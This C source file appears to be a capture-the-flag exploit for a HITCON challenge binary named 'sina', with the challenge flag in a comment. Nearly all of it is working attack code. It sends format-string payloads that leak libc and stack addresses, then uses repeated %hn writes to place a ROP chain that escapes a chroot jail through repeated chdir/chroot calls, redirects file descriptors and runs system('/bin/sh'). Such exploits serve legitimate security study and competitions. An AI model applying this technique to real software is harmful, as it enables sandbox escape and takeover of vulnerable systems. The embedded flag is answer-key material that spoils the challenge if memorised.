#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <assert.h>
#include <signal.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/wait.h>


// hitcon{fOrMaT_StRiNg_bUg_iS_DeAd_buT_ItS_EvErYwHeRe_iN_CtF_ChAlLeNgEs_wTf}

#define DEBUG

#ifdef DEBUG
const char *sina_cmd = "/home/user/gnu-chroot --userspec=1000:1000 /home/user/jail /bin/sh -c \"export PATH=/bin; cat /etc/banner; cd /home/user; ./sina\"";
#else
const char *sina_cmd = "/home/user/sina";
#endif

static char r_buf[0x1000];
static char w_buf[0x1000];

int s_fds[2];

// https://gist.github.com/ccbrown/9722406
void hexdump(const void* data, size_t size)
{
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        if (i % 16 == 0) printf("%04lx: ", i);
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}


pid_t spawn_process(char *cmd, char **env,  int *fds)
{
    int rfds[2];
    int wfds[2];

    pipe(rfds);
    pipe(wfds);

    int cid = fork();

    if (cid == -1) {
        printf("child spawn failed\n");
        return -1;
    }

    if (cid == 0) {
        close(rfds[0]);
        close(wfds[1]);

        dup2(wfds[0] , 0);
        dup2(rfds[1] , 1);

        char *argv[] = {cmd, NULL};
        execve(cmd, argv, env);
        printf("child: execve failed\n");
        assert(0);
    } else {
        close(rfds[1]);
        close(wfds[0]);

        fds[0] = rfds[0];
        fds[1] = wfds[1];
    }

    return cid;
}

void kill_child(pid_t cid)
{
    kill(cid, SIGKILL);
    return;
}

// from stackoverflow with extra printf
int child_alive(pid_t cid)
{
    // check if child is still alive..
    int status;
    pid_t result = waitpid(cid, &status, WNOHANG);
    if (result == 0) {
        // Child still alive
        printf("child alive!! :)\n");
        return 1;
    } else if (result == -1) {
        // Error
        printf("hmmm!!\n");
        return -1;
    } else {
        // Child exited
        printf("child dead!!?? - %d\n", status);
        return 0;
    }
}

#define check(x)                                            \
    do {                                                    \
        if (!(x)) {                                         \
            printf("check failed at line: %d\n", __LINE__); \
            goto err;                                       \
        }                                                   \
    } while (0)

#define cread_n(b,s)    read(s_fds[0], b, s)
#define cread(b,s)      check(cread_n(b, s) == s)

#define cwrite(b)       check(write(s_fds[1], b, strlen(b)+1) == strlen(b)+1)
#define cwrite_s(b,s)   check(write(s_fds[1], b, s) == (s))

#define pause()         do { char __pause_buf[1]; printf("waiting for input (line: %d)..", __LINE__); read(0, __pause_buf, 1); } while (0)

#define recvall(x)                                                          \
    while (x > 4096) {                                                    \
        ssize_t rr = cread_n(r_buf, 0x1000);                                \
        if (rr <= 0) {                                                      \
            printf("read failed: %ld - %d @ %d\n", rr, errno, __LINE__);    \
            goto err;                                                       \
        }                                                                   \
        /* printf("read-recv:0x%lx\n", rr); */ \
        x -= rr;                                                            \
    }


#define DOSYSTEM 1

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("starting...\n");

    dup2(0, 10);
    dup2(1, 11);
    dup2(2, 12);

    pid_t cid = spawn_process("./sina", envp, s_fds);
    if (cid == -1) {
        return -1;
    }

    // printf("reading banner...\n");
    // check(read(s_fds[0], r_buf, 0x2e0) == 0x2e0);

    char *fstr = "%p%c%p@%13$p@%43$p@%30$p@%45$p%175c%32$hhn%3832c\n";
    cwrite(fstr);

    cread(r_buf, 0x1000);
    // hexdump(r_buf, 0x80);

    // save leak
    uintptr_t ibase = strtoul(&r_buf[0], NULL, 16) - 0x4040;
    uintptr_t lbase = strtoul(&r_buf[15], NULL, 16) - 0xfda22;
    uintptr_t stk1 = strtoul(&r_buf[30], NULL, 16);
    uintptr_t stk2 = strtoul(&r_buf[45], NULL, 16);
    uintptr_t stk3 = strtoul(&r_buf[60], NULL, 16);
    uintptr_t stk4 = strtoul(&r_buf[75], NULL, 16);

    printf("ibase: %p\n", (void *)ibase);
    printf("lbase: %p\n", (void *)lbase);
    printf("stk1: %p\n", (void *)stk1);
    printf("stk2: %p\n", (void *)stk2);
    printf("stk3: %p\n", (void *)stk3);
    printf("stk4: %p\n", (void *)stk4);

    uintptr_t sretoff = 0x230;
    if (((stk1 - sretoff) >> 16) != (stk2 >> 16)) {
        printf("try again!!\n");
        goto err;
    }

    int val1 = (ibase & 0xffff) - 0x5f;
    int val2 = ((stk1 & 0xffff) - sretoff);

#if 1
    memset(w_buf, 0, 0x48);
    if (val1 < val2) {
        sprintf(w_buf, "%%%dc%%10$hn%%%dc%%35$hn\n", val1, val2 - val1);
        printf("val2: 0x%x\n", val2);
    } else if (val1 > val2) {
        sprintf(w_buf, "%%%dc%%35$hn%%%dc%%10$hn\n", val2, val1 - val2);
        printf("val1: 0x%x\n", val1);
    } else {
        sprintf(w_buf, "%%%dc%%10$hn%%35$hn\n", val1);
        printf("val12: 0x%x\n", val1);
    }

    if (child_alive(cid) <= 0) {
        printf("child died already!!");
        goto err;
    }

    // pause();
    cwrite(w_buf);
    if (child_alive(cid) <= 0) {
        printf("child died already!!");
        goto err;
    }
#else
    if (child_alive(cid) <= 0) {
        printf("child died already!!");
        goto err;
    }
    cwrite("%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p@@%10$p-%35$s%4096c\n");
    printf("read: %d\n", cread_n(r_buf, 0x1000));
    printf("%s\n", r_buf);
    hexdump(r_buf, 0x200);
    pause();

    goto err;
#endif

    uint32_t sroff2 = 0x210;
    ssize_t pr = 0;
    pr = val1 > val2 ? val1 : val2;
    recvall(pr);

    uint8_t mlsb = 112;
    sprintf(w_buf, "%%%dc%%75$hhn%%%dc%%62$hn\n", mlsb, (int)(stk1 & 0xffff) - sroff2 - mlsb);
    cwrite(w_buf);
    pr += (stk1 & 0xffff) - sroff2 - mlsb;
    recvall(pr);

    uintptr_t chdir_a  = lbase + 0xfe2f0;
    uintptr_t chroot_a = lbase + 0x103f80;
    uintptr_t system_a = lbase + 0x4e510;
    uintptr_t binsh_a  = lbase + 0x1b413f;
    uintptr_t execve_a = lbase + 0xda7f0;
    uintptr_t pop_rdi_ret = lbase + 0x196495;
    uintptr_t pop_rsi_ret = lbase + 0x197ad7;
    uintptr_t pop_rdx_ret = lbase + 0x1002c2;
    uintptr_t ret_a = lbase + 0x127753;

    uintptr_t pop_rsp_ret = lbase + 0x197cfb;
    uintptr_t close_a  = lbase + 0xFE0D0;
    uintptr_t open_a  = lbase + 0xFD730;
    uintptr_t dup_a = lbase + 0xFE160;
    uintptr_t dup2_a = lbase + 0xFE190;

    uint64_t rop[] = {
#if 0
        pop_rdi_ret,            // 0x00
        stk1 - sroff2 + 0xa0,
        chdir_a,                // 0x10
        pop_rdi_ret,
        stk1 - sroff2 + 0xa3,   // 0x20
        chroot_a,
        pop_rdi_ret,            // 0x30
        stk1 - sroff2 + 0xa0,
        chdir_a,                // 0x40
        chdir_a,
        chdir_a,                // 0x50
        chdir_a,
        chdir_a,                // 0x60
        chdir_a,
        chdir_a,                // 0x70
        pop_rdi_ret,
        stk1 - sroff2 + 0xa0,   // 0x80
        chroot_a,
        pop_rdi_ret,            // 0x90
        binsh_a,
        ret_a,                  // 0xa0
        system_a,
        0x0072657375002e2e,     // 0xb0
#else
#if 0
        pop_rdi_ret,            // 0x00
        stk1 - sroff2 + 0x140,
        chdir_a,                // 0x10
        pop_rdi_ret,
        stk1 - sroff2 + 0x143,  // 0x20
        chroot_a,
        pop_rdi_ret,            // 0x30
        stk1 - sroff2 + 0x140,
        chdir_a,                // 0x40
        chdir_a,
        chdir_a,                // 0x50
        chdir_a,
        chdir_a,                // 0x60
        chdir_a,
        chdir_a,                // 0x70
        chdir_a,
        chdir_a,                // 0x80
        pop_rdi_ret,
        stk1 - sroff2 + 0x140,  // 0x90
        chroot_a,
        pop_rdi_ret,            // 0xa0
        0,
        close_a,                // 0xb0
        pop_rdi_ret,
        1,                      // 0xc0
        close_a,
        pop_rdi_ret,            // 0xd0
        stk1 - sroff2 + 0x148,
        pop_rsi_ret,            // 0xe0
        0,
        open_a,                 // 0xf0
        pop_rdi_ret,
        stk1 - sroff2 + 0x148,  // 0x100
        pop_rsi_ret,
        1,                      // 0x110
        open_a,
        pop_rdi_ret,            // 0x120
        binsh_a,
        ret_a,                  // 0x130
        system_a,
        0x0072657375002e2e,     // 0x140
        0x65732f636f72702f,
        0x00322f64662f666c
#endif
        pop_rdi_ret,            // 0x00
        stk1 - sroff2 + 0x130,
        chdir_a,                // 0x10
        pop_rdi_ret,
        stk1 - sroff2 + 0x133,  // 0x20
        chroot_a,
        pop_rdi_ret,            // 0x30
        stk1 - sroff2 + 0x130,
        chdir_a,                // 0x40
        chdir_a,
        chdir_a,                // 0x50
        chdir_a,
        chdir_a,                // 0x60
        chdir_a,
        chdir_a,                // 0x70
        chdir_a,
        chdir_a,                // 0x80
        pop_rdi_ret,
        stk1 - sroff2 + 0x130,  // 0x90
        chroot_a,
        pop_rdi_ret,            // 0xa0
        10,
        pop_rsi_ret,            // 0xb0
        0,
        dup2_a,                 // 0xc0
        pop_rdi_ret,
        11,                     // 0xd0
        pop_rsi_ret,
        1,                      // 0xe0
        dup2_a,
        pop_rdi_ret,            // 0xf0
        12,
        pop_rsi_ret,            // 0x100
        2,
        dup2_a,                 // 0x110
        pop_rdi_ret,
        binsh_a,                // 0x120
        system_a,
        0x0072657375002e2e,     // 0x130
#endif
    };

    uint16_t rop_r[sizeof(rop) / 2];
    memcpy(rop_r, rop, sizeof(rop));
    int rop_idxs = sizeof(rop) / 2;

    for (int i = 0; i < rop_idxs; i++) {
        int val = rop_r[i];
        int ao = ((stk1 & 0xffff) - sroff2) + ((i+1) * 2);
        int aa = 0;

        // printf("i: 0x%x: val = 0x%x\n", i, val);
        if (ao < val) {
            if ((val & 0xff) < mlsb) {
                aa = mlsb - (val & 0xff);
            } else {
                aa = 0x100 - (val & 0xff) + mlsb;
            }
            sprintf(w_buf, "%%%dc%%62$hn%%%dc%%77$hn%%%dc%%75$hhn\n", ao, val-ao, aa);
            pr += val + aa;
        } else if (ao == val) {
            if (mlsb < ao) {
                sprintf(w_buf, "%%%dc%%75$hhn%%%dc%%62$hn%%77$hn\n", mlsb, ao-mlsb);
                pr += ao;
            } else {
                sprintf(w_buf, "%%%dc%%62$hn%%77$hn%%%dc%%75$hhn\n", ao, mlsb-ao);
                pr += mlsb;
            }
        } else {
            if ((ao & 0xff) < mlsb) {
                aa = mlsb - (ao & 0xff);
            } else {
                aa = 0x100 - (ao & 0xff) + mlsb;
            }

            if (val != 0) {
                sprintf(w_buf, "%%%dc%%77$hn%%%dc%%62$hn%%%dc%%75$hhn\n", val, ao-val, aa);
            } else {
                sprintf(w_buf, "%%77$hn%%%dc%%62$hn%%%dc%%75$hhn\n", ao, aa);
            }
            pr += ao + aa;
        }

        // printf("writing: %s", w_buf);
        cwrite(w_buf);
        // printf("pr: 0x%lx\n", pr);
        recvall(pr);
        // printf("recv done!!\n");
        fflush(stdout);
    }

    // check the stack if we wrote anything or not
    sprintf(w_buf, "%%%ldc\n", 4096-pr-0x10);
    cwrite(w_buf);

    if (child_alive(cid) <= 0) {
        printf("child died after attempt!!");
        goto err;
    }

    waitpid(cid, NULL, 0);

    return 0;

err:
    child_alive(cid);
    kill_child(cid);
    fflush(stdout);
    return -1;
}